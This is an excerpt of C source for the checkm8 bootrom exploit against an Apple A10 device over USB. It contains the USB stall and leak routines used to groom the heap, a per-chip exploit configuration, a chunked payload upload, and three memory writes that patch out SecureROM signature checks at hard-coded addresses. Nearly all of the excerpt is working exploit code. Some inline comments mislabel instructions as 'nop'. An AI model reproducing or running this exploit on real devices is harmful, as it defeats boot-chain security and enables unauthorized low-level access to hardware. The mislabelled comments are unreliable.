...
static int stall(irecv_client_t client){
    return irecv_async_usb_control_transfer_with_cancel(client, 0x80, 6, 0x304, 0x40A, blank_buf, 0xC0, 10);
}

static int leak(irecv_client_t client){
    return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, blank_buf, 0xC0, 1);
}

static int no_leak(irecv_client_t client){
    return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, blank_buf, 0xC1, 1);
}
...
static int get_exploit_configuration64(uint16_t cpid, checkm8_64_t* config) {
    switch(cpid) {
        case 0x8010:
            config->hole = 5;
            config->leak = 1;
            config->overwrite_offset = 0x580;
            config->overwrite = A10over; //
            config->overwrite_len = A10over_len; //
            return 0;
        default:
            printf("No exploit configuration is available for your device.\n");
            return -1;
...
int checkm8_64_exploit(irecv_client_t client, irecv_device_t device_info, const struct irecv_device_info *info){
    ...
    unsigned char buf[0x800] = { 'A' };
    checkm8_64_t config;
    memset(&config, '\0', sizeof(checkm8_64_t));
    
    r = get_exploit_configuration64(chipid, &config);
    if(r != 0) {
        printf("\x1b[31mERROR: Failed to get exploit configuration.\x1b[39m\n");
        irecv_close(client);
        return -1;
    ...
    DEBUG_("\x1b[36mUploading payload\x1b[39m\n");
    {
        void *buff = malloc(A10_len);
        memcpy(buff, A10, A10_len);
        
        size_t len = 0;
        size_t size;
        size_t sent;
        while(len < A10_len) {
            size = ((A10_len - len) > 0x800) ? 0x800 : (A10_len - len);
            sent = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, (unsigned char*)&buff[len], size, 100);
            len += size;
        }
    ...
    if(1){
        ...
        uint64_t writeSignatureAddr1 = 0x0000000100006C80;
        uint64_t writeSignatureAddr2 = 0x0000000100006ca0;
        uint64_t writeSignatureAddr3 = 0x000000010000f1b0;
        ...
        usleep(50000);
        DEBUG_("\x1b[36mRemoving SecureROM Signature check 1\x1b[39m\n");
        
        payload_writeSignature = malloc(68);
        bzero(payload_writeSignature, 68);
        
        *((uint32_t*)(payload_writeSignature+ 0)) = MEMC;
        *((uint32_t*)(payload_writeSignature+ 4)) = MEMC;
        *((uint64_t*)(payload_writeSignature+16)) = writeSignatureAddr1;
        *((uint64_t*)(payload_writeSignature+24)) = dfu_image_base + 16 + (3 * 8); // load_base + 16 + (index * 4)
        *((uint64_t*)(payload_writeSignature+32)) = 7*4;
        *((uint32_t*)(payload_writeSignature+40)) = 0x52800021;
        *((uint32_t*)(payload_writeSignature+44)) = 0x3903e3e1;
        *((uint32_t*)(payload_writeSignature+48)) = 0x3903efe1;
        *((uint32_t*)(payload_writeSignature+52)) = 0x3903f7e1;
        *((uint32_t*)(payload_writeSignature+56)) = 0x3903ebe1;
        *((uint32_t*)(payload_writeSignature+60)) = 0x3903f3e1;
        *((uint32_t*)(payload_writeSignature+64)) = 0x3903fbe1;
        
        send_data(client, blank, 16);
        irecv_usb_control_transfer(client, 0x21, 1, 0, 0, NULL, 0, 100);
        irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 100);
        irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 100);
        send_data(client, payload_writeSignature, 68);
        ...
        usleep(50000);
        DEBUG_("\x1b[36mRemoving SecureROM Signature check 2\x1b[39m\n");
        
        *((uint64_t*)(payload_writeSignature+16)) = writeSignatureAddr2;
        *((uint64_t*)(payload_writeSignature+32)) = 3*4;
        *((uint32_t*)(payload_writeSignature+40)) = 0xd503201f; // nop
        *((uint32_t*)(payload_writeSignature+44)) = 0xd503201f; // nop
        *((uint32_t*)(payload_writeSignature+48)) = 0xd503201f; // nop
        ...
        irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 100);
        irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 100);
        send_data(client, payload_writeSignature, 52);
        ...
        usleep(50000);
        DEBUG_("\x1b[36mRemoving SecureROM Signature check 3\x1b[39m\n");
        
        *((uint64_t*)(payload_writeSignature+16)) = writeSignatureAddr3;
        *((uint64_t*)(payload_writeSignature+32)) = 2*4;
        *((uint32_t*)(payload_writeSignature+40)) = 0xd2800000; // nop
        *((uint32_t*)(payload_writeSignature+44)) = 0xd65f03c0; // nop
        ...
        irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 100);
        irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 100);
        send_data(client, payload_writeSignature, 48);
